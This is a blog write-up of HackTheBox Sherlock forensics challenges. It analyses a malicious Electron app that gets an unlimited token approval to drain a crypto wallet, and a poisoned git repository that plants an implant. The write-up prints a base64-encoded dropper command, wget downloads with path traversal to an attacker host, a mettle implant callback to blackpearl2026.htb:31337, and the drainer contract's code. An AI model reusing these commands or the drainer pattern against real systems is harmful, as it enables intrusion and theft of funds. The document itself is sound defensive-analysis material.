---
title: HackTheBox's Sherlock 2026 Write-up
date: 2026-09-28
draft: false
showToc: true 
tags:
  - Sherlock
  - Write-up
  - Forensics 
---


Honestly, it recently feels sooooo boring writing a CTF challenge write-up. You know, with the rise of AI, doing all of these is kinda pointless now. 

Well, at least luckily, I'm a project-person. 

# 1 

Which Win32 structure defines the format of the buffer returned by the Lua script when monitoring directory changes? (string) - `FILE_NOTIFY_INFORMATION`

Which Win32 API is used by the Lua script to send an HTTP request to the remote server? (string) - `WinHttpSendRequest`

What token function does the HTML page call to request spending permission? (function()) - `approve()`

What ethers.js v6 provider class is used to connect to the browser wallet? (string) - `BrowserProvider`

-> Theoretical knowledge 


Extracted the exe using binwalk, you found the 7z archive, then continue to extract `app.asar` within resources using the command `npx asar extract app.asar app_extracted` (`npx` is found within package `npm`)

To which directory does the application copy the files bundled within the extraResources folder? `(*:\path\to\dir)` - `C:\\Users\\Public` - Found in `~/Downloads/SilentDividend/danger/extractions/TrustSettle 1.0.0.exe.extracted/C540/resources/app_extracted/preload.js`

Which smart contract function does the Electron application invoke to retrieve the decryption key for the encrypted payload? (`function()`) - `resolveState()` - Found at the same location as the previous 

## Decoding encrypted data 

```bash
└─➜ node -e "console.log(require('ethers').id('resolveState()').slice(0,10))"                                  [0]
0x77b3774c


└─➜ curl -X POST https://ethereum-sepolia-rpc.publicnode.com \                                                 [0]
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "eth_call",
    "params": [{
      "to": "0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1",
      "data": "0x77b3774c"
    }, "latest"],
    "id": 1
  }'
{"jsonrpc":"2.0","id":1,"result":"0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4"}

```
Thats our key (the last line)

The encrypted data lies within preload.js (the same file as above)

```python
key = bytes.fromhex("3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4")
data = bytes.fromhex("560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0")

result = bytearray()
for i in range(len(data)):
    key_byte = key[i % len(key)]
    step1 = data[i] ^ key_byte
    step2 = ((step1 << 7) | (step1 >> 1)) & 0xff
    result.append(step2 ^ 0x42)

print(result.decode('utf-8'))
```


```bash
# Output
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

And we also able to answer the question:
> Which environment variable corresponds to the directory where the application copies the HTML file from its package? (string)

That was `%TEMP%`

## Next 

> What is the exact token amount passed to the approval call? (number)

In `preload.js`, you saw this line:

```js
const indexContent = fs.readFileSync(path.join(__dirname, 'src', 'settlement.html'), 'utf8');
fs.writeFileSync(path.resolve(`${process.resourcesPath}/../../settlement.html`), indexContent, 'utf8');
```

So `settlement.html` is the page that gets copied out and rendered. That's where the ethers.js code for the token approval will be.

Within said file look for `approve(`. There should be something like:

```
await token.approve(spender, amount)
```

Within `settlement.html`: 

```js
async function requestApproval() {
    try {
        setStatus("Requesting token approval...", "loading");

        const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
        const unlimitedAmount = ethers.MaxUint256;

        const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);
        await tx.wait();

        setStatus(
            `Approved`,
            "success"
        );

        setTimeout(() => {
            alert(
                "Thank you for approval!"
            );
        }, 1500);

    } catch (err) {
        setStatus(`Error during approval: ${err.message}`, "error");
        document.getElementById("agreeBtn").disabled = false;
    }
}
```

The Answer would be whatever is the amount of `ethers.MaxUint256` - a constant in `ethers.js` v6. So the value is: 

```
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

## Final question 

> Analyze the HTML page to uncover a smart contract reference. Investigate the contract's logic and determine how to interact with it to recover the hidden flag. `(**.****,*.****)`



The address `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D` is referenced as `X0_CONTRACT_ADDRESS` and is the **spender** in the `approve()` call.

The challenge hint format `(**.****,*.****)` might suggests a **function call with arguments** — likely something like `getFlag(bytes32)` or a two-argument function.




Go to this address: 
```
https://sepolia.etherscan.io/address/0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D
```


Look at the Contract tab. You would find `wallet.sol`: 

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = 1000 ether;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "not approved");
        require(balanceOf[from] >= amount, "insufficient balance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract x0 {
    MockToken public x1;

    bytes32 private x2 = 0x7ccb3a440e383635148b237df8bb22dff0b594425beae88d6e1623df0bc7669b;
    bytes32 private x3 = 0x7ccb3a440e383635148b237d13473c069ba9ffd6545c58ee37e969b87d181c01;

    bytes private x4;

    event x5(address indexed);

    constructor(address x6) {
        x1 = MockToken(x6);
    }

    function x7() public view returns (address) {
        return address(uint160(uint256(x2) ^ uint256(x3)));
    }

    function x8(bytes calldata cipherFlag) external {
        require(x4.length == 0, "already set");
        x4 = cipherFlag;
    }
	
	function x9(address x10) external view returns (string memory) {
		require(x10 == x7(), "not quite - keep analyzing");
		bytes memory decrypted = _crypt(x4, x10);
		return string(decrypted);
	}

	function _crypt(bytes memory data, address key) internal pure returns (bytes memory) {
		bytes memory out = new bytes(data.length);
		uint256 i = 0;
		uint256 counter = 0;
		while (i < data.length) {
			bytes32 block_ = keccak256(abi.encodePacked(key, counter));
			for (uint256 j = 0; j < 32 && i < data.length; j++) {
				out[i] = data[i] ^ block_[j];
				i++;
			}
			counter++;
		}
		return out;
	}

    function x11(address x12) external {
        require(msg.sender == x7(), "only hidden owner");
        uint256 bal = x1.balanceOf(x12);
        x1.transferFrom(x12, x7(), bal);
    }
}
```

### x7 

```python
>>> x2 = 0x7ccb3a440e383635148b237df8bb22dff0b594425beae88d6e1623df0bc7669b
... x3 = 0x7ccb3a440e383635148b237d13473c069ba9ffd6545c58ee37e969b87d181c01
... 
... xor = x2 ^ x3
... # Take lower 160 bits (last 40 hex chars)
... hidden_owner = "0x" + hex(xor)[-40:]
... print ("x7")
... print (hidden_owner)
... 
x7
0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a
```

Turns out you may not even to decrypt x7. Since it's a known information in other tab. Which is shown in the table below. 


| R/W | variable | address                                    |
| --- | -------- | ------------------------------------------ |
| R   | x1       | 0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2 |
| R   | x7       | 0xEBfC1eD96b1C6b940fb6B06359fF4A6776Df7a9A |
| R   | x9       | x10                                        |
| W   | x11      | x12                                        |
| W   | x8       | cipherFlag (bytes)                         |

It is required that `x7 == x10`. 

Response: 
```
Result:x9(address) method Responsestring

string:

51.5049,0.0348
```

Oh, that's our flag. Huh. Weird. 

# 5

> What was the name of the malicious repository? (string)

`diogenes-ticket-parser`

> What file holds the encrypted payload? (filename.ext)

`calibration.bin`

Within the same directory with `calibration.bin`. Though, I don't remember which at file did I found this. It will be important later:  
```python
_CALIBRATION = (
    b"Y2htb2QgK3ggfi8uY2FjaGUvLnRpY2tldC1wYXJzZXIvLmludGVncml0eTsgfi8uY2FjaGUvLnRpY2tldC1wYXJzZXIvLmludGVncml0eSAyPiYxICY="
) 
# chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &

_CACHE_DIR = b"LmNhY2hl" # .cache
_PARSER_DIR = b"LnRpY2tldC1wYXJzZXI=" # .ticket-parser
_FILE = b"LmludGVncml0eQ==" # .integrity
```

> What email address is listed for the author of the repo? (email address)
```bash
~/Downloads/PoisonedBranch/home/Tom/Projects/diogenes-ticket-parser$ git log
commit 81d8e7448c185be0733d8cab67b40a2e572fd91e (HEAD -> main, origin/main, origin/HEAD)
Author: Sebastain Moran <cbass.Moran@blackpearl2026.htb>
Date:   Fri Sep 11 16:05:06 2026 +0100

    Initial project import
```

> What is the full path of the c2 implant? (`/path/to/file`)
```
/home/Tom/.cache/.ticket-parser/.integrity
```

> What port did the implant connect back to (number)? And its pid, as well?

Within the `ss_-tanp.txt`: 
```
State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process                              
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=629,fd=3))       
ESTAB  0      0       192.168.0.21:50878 203.0.113.10:31337 users:((".integrity",pid=1514,fd=4))
LISTEN 0      128             [::]:22            [::]:*     users:(("sshd",pid=629,fd=4))       

```


> The attacker tried to use URL:PORT before using IP:PORT to download a file to Tom's machine. What was the URL:PORT combo? (set the spawned vm IP to this URL in your /etc/hosts to complete the challenge)


```
moran@BlackPearl -> ssh address -> pid is 629
```

```
└─➜ nmap 10.129.5.145                                                                                          [0]
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-20 14:27 +0700
Nmap scan report for 10.129.5.145 (10.129.5.145)
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds
```

In audit.log 

```
type=SYSCALL msg=audit(1789482400.268:366): arch=c000003e syscall=59 success=yes exit=0 a0=5642c1639aa8 a1=5642c1639830 a2=5642c1639868 a3=8 items=3 ppid=1516 pid=1520 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="wget" exe="/usr/bin/wget" subj=unconfined key="tom_exe" ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482400.268:366): argc=6 a0="wget" a1="-q" a2=2D2D6865616465723D436F6F6B69653A20582D4F70657261746F722D417574683D6E61706F6C656F6E5F6D6F72616E5F31383934 a3="-O" a4="authorized_keys" a5=687474703A2F2F426C61636B506561726C323032362E6874623A393939392F646F776E6C6F61643F66696C653D2E2E2F2E2E2F2E7373682F69645F7273612E7075620A6C73202D6C610A
```

Means: 

```
wget -q --header="Cookie: X-Operator-Auth=napoleon_moran_1894" \
     -O authorized_keys \
     http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub
```


This happen before: 
```
type=EXECVE msg=audit(1789482890.524:369): argc=6 a0="wget" a1="-q" a2=2D2D6865616465723D436F6F6B69653A20582D4F70657261746F722D417574683D6E61706F6C656F6E5F6D6F72616E5F31383934 a3="-O" a4="authorized_keys" a5="http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub"
```
Means: 

```
wget -q --header="Cookie: X-Operator-Auth=napoleon_moran_1894" \
     -O authorized_keys \
     http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub
```

> What is the name of the Cookie/Token for the attackers web server? (Header=value)
```
X-Operator-Auth=napoleon_moran_1894
```

> The attacker deleted a file before leaving. What command did they run? (string)

```
rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
```

From:
```audit.log 
type=SYSCALL msg=audit(1789483257.580:381): arch=c000003e syscall=59 success=yes exit=0 a0=55ed9075b9c0 a1=55ed9075b8e0 a2=55ed9075b8f8 a3=8 items=3 ppid=1549 pid=1551 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="rm" exe="/usr/bin/rm" subj=unconfined key="tom_exe" ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483257.580:381): argc=2 a0="rm" a1="Gov_HR_Continuity_Emergency_Callout_Roster.pdf"
type=CWD msg=audit(1789483257.580:381): cwd="/home/Tom/Work_Stuff/ONBOARDING"
```

> What was the ppid of the command from the previous question? (number)

-> 1549 

> Extra notes, might be useful later. 

Parsing `.integrity` strings: 
```
mettle -U "DZX5O4OdQwxuIGgiBIR4cA==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "tcp://blackpearl2026.htb:31337" -d "0" -o "" -b "0" 
```
Also:

```
/etc/group
/var/run/nscd/socket
/proc/self/task
/etc/localtime
TZif
/usr/share/zoneinfo/
/share/zoneinfo/
/etc/zoneinfo/

```

```
search
/etc/passwd
/usr/local/bin:/bin:/usr/bin
```



